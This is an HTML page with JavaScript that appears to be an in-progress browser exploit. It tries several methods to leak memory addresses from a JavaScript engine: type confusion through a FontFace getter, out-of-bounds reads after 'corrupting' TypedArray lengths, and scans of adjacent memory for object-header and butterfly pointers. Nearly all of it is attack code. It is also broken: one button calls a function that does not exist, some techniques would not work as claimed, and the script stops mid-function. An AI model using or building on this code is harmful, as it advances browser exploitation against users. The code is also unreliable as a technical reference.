<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Alternative Leak Methods</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; font-size: 14px; line-height: 1.6; }
        h1 { color: #f00; font-size: 24px; margin-bottom: 20px; text-align: center; border-bottom: 3px solid #f00; padding-bottom: 10px; }
        .btn { padding: 15px 30px; background: #f00; border: none; color: #fff; margin: 8px auto; cursor: pointer; font-size: 15px; font-weight: bold; display: block; width: 420px; }
        .section { background: #1a0000; border: 2px solid #f00; margin: 15px 0; padding: 20px; max-height: 700px; overflow-y: auto; }
        .title { color: #ff0; font-size: 18px; font-weight: bold; margin-bottom: 15px; border-bottom: 2px solid #ff0; padding-bottom: 8px; }
        .log { padding: 4px 0; font-size: 13px; }
        .success { color: #0f0; font-weight: bold; }
        .fail { color: #f00; font-weight: bold; }
        .warn { color: #ff0; font-weight: bold; }
        .info { color: #0ff; }
        .critical { color: #f0f; font-weight: bold; background: rgba(255,0,255,0.1); padding: 5px; margin: 5px 0; }
        .addr { background: #222; border: 2px solid #0ff; padding: 8px; margin: 8px 0; font-size: 15px; color: #fff; }
    </style>
</head>
<body>
    <h1>🔍 Alternative Address Leak Methods 🔍</h1>
    
    <div style="text-align: center; margin-bottom: 20px;">
        <button class="btn" onclick="method1_ArrayBuffer()">Method 1: ArrayBuffer Backing Store</button>
        <button class="btn" onclick="method2_TypedArrayBase()">Method 2: TypedArray Base Pointer</button>
        <button class="btn" onclick="method3_StringInternals()">Method 3: String Rope Internals</button>
        <button class="btn" onclick="method4_JSValueConfusion()">Method 4: JSValue Box/Unbox</button>
        <button class="btn" onclick="method5_StructureID()">Method 5: Structure ID Leak</button>
    </div>
    
    <div class="section">
        <div class="title">📋 Alternative Leak Log</div>
        <div id="log"></div>
    </div>

<script>
var convBuf = new ArrayBuffer(8);
var f64 = new Float64Array(convBuf);
var u32 = new Uint32Array(convBuf);
var u8 = new Uint8Array(convBuf);

function f2i(f) {
    f64[0] = f;
    return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
}

function i2f(i) {
    var bi = BigInt(i);
    u32[0] = Number(bi & 0xffffffffn);
    u32[1] = Number(bi >> 32n);
    return f64[0];
}

function hex(val) {
    if (typeof val === 'bigint') {
        var s = val.toString(16);
        while (s.length < 16) s = '0' + s;
        return '0x' + s;
    }
    if (typeof val === 'number') {
        return '0x' + val.toString(16);
    }
    return String(val);
}

function log(msg, type) {
    var div = document.createElement('div');
    div.className = 'log ' + (type || '');
    div.textContent = msg;
    document.getElementById('log').appendChild(div);
}

function logAddr(label, addr) {
    var div = document.createElement('div');
    div.className = 'addr';
    div.textContent = label + ': ' + addr;
    document.getElementById('log').appendChild(div);
}

function sep() {
    log('═'.repeat(85), 'info');
}

function isValidPtr(val) {
    return val > 0x10000n && val < 0x7fffffffffffn && val !== 0x7ff8000000000000n;
}

// ============================================
// METHOD 1: ArrayBuffer Backing Store Leak
// ============================================
function method1_ArrayBuffer() {
    document.getElementById('log').innerHTML = '';
    sep();
    log('METHOD 1: ArrayBuffer Backing Store Pointer Leak', 'critical');
    log('Concept: ArrayBuffer has a backing store pointer we can try to leak', 'info');
    sep();
    log('', '');
    
    try {
        log('[1] Creating ArrayBuffer and TypedArray views...', 'info');
        
        var ab = new ArrayBuffer(0x1000);
        var u32view = new Uint32Array(ab);
        var f64view = new Float64Array(ab);
        
        // Fill with pattern
        for (var i = 0; i < 16; i++) {
            u32view[i] = 0x41410000 + i;
        }
        
        log('ArrayBuffer size: ' + hex(ab.byteLength), 'success');
        log('Uint32Array length: ' + u32view.length, 'success');
        log('Float64Array length: ' + f64view.length, 'success');
        log('', '');
        
        log('[2] Attempting to leak ArrayBuffer object itself...', 'info');
        
        // Create confusion with ArrayBuffer object
        var ff = new FontFace("ab", "");
        
        Object.defineProperty(ff, 'family', {
            get: function() { return ab; },
            configurable: true
        });
        
        var floats = new Float64Array(10);
        
        try {
            floats[0] = ff.family;
            var rb = floats[0];
            
            log('Stored ArrayBuffer in float array', 'success');
            log('Readback type: ' + typeof rb, 'info');
            
            if (typeof rb === 'number' && !isNaN(rb)) {
                var bits = f2i(rb);
                logAddr('ArrayBuffer object bits', hex(bits));
                
                if (isValidPtr(bits)) {
                    log('⚠️ POSSIBLE ARRAYBUFFER OBJECT LEAK!', 'critical');
                } else {
                    log('Invalid pointer value', 'fail');
                }
            } else {
                log('Type confusion returned NaN', 'fail');
            }
        } catch(e) {
            log('Error: ' + e.message, 'fail');
        }
        
        log('', '');
        log('[3] Trying to corrupt TypedArray to leak backing store...', 'info');
        
        // Corrupt the Uint32Array length
        try {
            Object.defineProperty(u32view, 'length', {
                value: 0x100000,
                configurable: true
            });
            
            if (u32view.length > 0x1000) {
                log('✓ TypedArray length corrupted!', 'critical');
                log('New length: ' + hex(u32view.length), 'critical');
                
                // Try to read adjacent ArrayBuffer metadata
                log('', '');
                log('Scanning for ArrayBuffer metadata in adjacent memory...', 'info');
                
                for (var i = 0x1000; i < 0x1100; i++) {
                    var val = u32view[i];
                    
                    if (typeof val !== 'undefined' && val !== 0) {
                        log('  [' + hex(i) + '] = ' + hex(val), 'warn');
                    }
                }
            } else {
                log('Length corruption blocked', 'fail');
            }
        } catch(e) {
            log('Length corruption error: ' + e.message, 'fail');
        }
        
        sep();
        
    } catch(e) {
        log('', '');
        log('✗ METHOD 1 ERROR: ' + e.message, 'fail');
    }
}

// ============================================
// METHOD 2: TypedArray Base Pointer
// ============================================
function method2_TypedArrayBase() {
    document.getElementById('log').innerHTML = '';
    sep();
    log('METHOD 2: TypedArray Base Pointer Leak', 'critical');
    log('Concept: TypedArray has internal pointer to data, try to expose it', 'info');
    sep();
    log('', '');
    
    try {
        log('[1] Creating adjacent TypedArrays in memory...', 'info');
        
        var arrays = [];
        for (var i = 0; i < 20; i++) {
            var arr = new Uint32Array(64);
            arr[0] = 0x11110000 + i;
            arr[1] = 0x22220000 + i;
            arrays.push(arr);
        }
        
        log('Created ' + arrays.length + ' TypedArrays', 'success');
        log('', '');
        
        log('[2] Corrupting middle array for OOB access...', 'info');
        
        var victim = arrays[10];
        
        try {
            Object.defineProperty(victim, 'length', {
                value: 0x10000,
                configurable: true
            });
            
            if (victim.length > 64) {
                log('✓ Victim array corrupted to length ' + hex(victim.length), 'critical');
                log('', '');
                
                log('[3] Reading adjacent array metadata...', 'info');
                
                // Arrays are usually allocated close together
                // Try to find TypedArray structure in adjacent memory
                var foundData = [];
                
                for (var i = 64; i < 128; i++) {
                    var val = victim[i];
                    
                    if (typeof val !== 'undefined' && val !== 0) {
                        foundData.push({ offset: i, value: val });
                        
                        if (foundData.length < 10) {
                            log('  [' + i + '] = ' + hex(val), 'warn');
                        }
                    }
                }
                
                if (foundData.length > 0) {
                    log('', '');
                    log('Found ' + foundData.length + ' non-zero values in adjacent memory!', 'critical');
                    
                    // Look for pointer-like values (pairs that might be 64-bit pointers)
                    for (var i = 0; i < foundData.length - 1; i++) {
                        var low = foundData[i].value;
                        var high = foundData[i + 1].value;
                        
                        var ptr = BigInt(low) + (BigInt(high) << 32n);
                        
                        if (isValidPtr(ptr)) {
                            logAddr('Possible pointer at offset ' + foundData[i].offset, hex(ptr));
                        }
                    }
                }
            } else {
                log('Length corruption failed', 'fail');
            }
        } catch(e) {
            log('Corruption error: ' + e.message, 'fail');
        }
        
        sep();
        
    } catch(e) {
        log('', '');
        log('✗ METHOD 2 ERROR: ' + e.message, 'fail');
    }
}

// ============================================
// METHOD 4: JSValue Box/Unbox Confusion
// ============================================
function method4_JSValueConfusion() {
    document.getElementById('log').innerHTML = '';
    sep();
    log('METHOD 4: JSValue Boxing/Unboxing Tricks', 'critical');
    log('Concept: Confuse boxed vs unboxed values to leak metadata', 'info');
    sep();
    log('', '');
    
    try {
        log('[1] Creating objects with number properties...', 'info');
        
        var obj = {
            a: 1.1,
            b: 2.2,
            c: 3.3,
            d: {},  // Boxed object
            e: 4.4
        };
        
        log('Object with mixed types created', 'success');
        log('', '');
        
        log('[2] Using Object.defineProperty to create getters...', 'info');
        
        var victimArray = new Float64Array(20);
        var leakTarget = null;
        
        Object.defineProperty(obj, 'leak', {
            get: function() {
                // Return different types on consecutive calls
                this._callCount = (this._callCount || 0) + 1;
                
                if (this._callCount % 2 === 0) {
                    return 1.1;
                } else {
                    return leakTarget;
                }
            },
            configurable: true
        });
        
        log('Alternating getter installed', 'success');
        log('', '');
        
        log('[3] Attempting type confusion via repeated access...', 'info');
        
        leakTarget = { marker: 0xdeadbeef };
        
        for (var i = 0; i < 10; i++) {
            var val = obj.leak;
            
            try {
                victimArray[i] = val;
                var rb = victimArray[i];
                
                log('Access ' + i + ': stored type=' + typeof val + ', read type=' + typeof rb, 'info');
                
                if (typeof rb === 'number' && !isNaN(rb)) {
                    var bits = f2i(rb);
                    
                    if (bits !== f2i(1.1) && isValidPtr(bits)) {
                        logAddr('Possible leak at access ' + i, hex(bits));
                    }
                }
            } catch(e) {
                log('Access ' + i + ' error: ' + e.message, 'fail');
            }
        }
        
        sep();
        
    } catch(e) {
        log('', '');
        log('✗ METHOD 4 ERROR: ' + e.message, 'fail');
    }
}

// ============================================
// METHOD 5: Structure ID / Butterfly Leak
// ============================================
function method5_StructureID() {
    document.getElementById('log').innerHTML = '';
    sep();
    log('METHOD 5: Structure ID / Butterfly Pointer Leak', 'critical');
    log('Concept: JSObjects have StructureID and Butterfly pointer in header', 'info');
    sep();
    log('', '');
    
    try {
        log('[1] Creating objects with indexed properties (butterfly)...', 'info');
        
        var obj = {};
        obj[0] = 1.1;
        obj[1] = 2.2;
        obj[100] = 3.3;  // Forces butterfly allocation
        
        log('Object with sparse array created (has butterfly)', 'success');
        log('', '');
        
        log('[2] Creating corrupted array for scanning...', 'info');
        
        var scanner = new Uint32Array(0x100);
        
        for (var i = 0; i < scanner.length; i++) {
            scanner[i] = 0xBBBB0000 + i;
        }
        
        try {
            Object.defineProperty(scanner, 'length', {
                value: 0x100000,
                configurable: true
            });
            
            if (scanner.length > 0x100) {
                log('✓ Scanner array corrupted!', 'critical');
                log('', '');
                
                log('[3] Scanning for JSObject headers in adjacent memory...', 'info');
                log('Looking for Structure ID patterns...', 'info');
                
                var candidates = [];
                
                // Scan adjacent memory
                for (var i = 0x100; i < 0x300; i += 2) {
                    var low = scanner[i];
                    var high = scanner[i + 1];
                    
                    if (typeof low !== 'undefined' && typeof high !== 'undefined') {
                        // JSObject header format (simplified):
                        // [StructureID:32][IndexingType:8][Type:8][Flags:8][InlineCapacity:8]
                        // [Butterfly pointer:64]
                        
                        if (low !== 0 || high !== 0) {
                            var qword = BigInt(low) + (BigInt(high) << 32n);
                            
                            // Check if this looks like a butterfly pointer
                            if (isValidPtr(qword) && (qword & 0xfn) === 0n) {
                                candidates.push({ offset: i, value: qword });
                                
                                if (candidates.length <= 5) {
                                    logAddr('Candidate ' + candidates.length + ' at [' + hex(i) + ']', hex(qword));
                                }
                            }
                        }
                    }
                }
                
                if (candidates.length > 0) {
                    log('', '');
                    log('Found ' + candidates.length + ' pointer candidates!', 'critical');
                } else {
                    log('No valid pointers found in scanned memory', 'fail');
                }
                
            } else {
                log('Scanner corruption failed', 'fail');
            }
        } catch(e) {
            log('Scanner corruption error: ' + e.message, 'fail');
        }
        
        sep();
        
    } catch(e) {
        log('', '');
        log('✗ METHOD 5 ERROR: ' + e.message, 'fail');
    }
}

window.onerror = function(msg, url, line) {
